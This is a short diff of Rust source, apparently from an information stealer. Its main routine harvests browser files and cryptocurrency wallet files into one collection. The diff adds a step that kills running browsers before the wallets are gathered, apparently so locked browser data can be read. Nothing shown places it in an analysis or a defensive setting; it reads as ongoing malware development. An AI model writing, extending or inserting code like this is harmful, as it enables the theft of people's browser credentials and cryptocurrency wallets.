@@ -153,7 +153,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     std::thread::sleep(std::time::Duration::from_millis(1500));
 
     let mut all_files = browsers::run();
-    
+
+    core::kill::kill_browsers();
+
     let wallet_files = wallet::collect_wallets();
     for (name, content) in wallet_files {
         all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
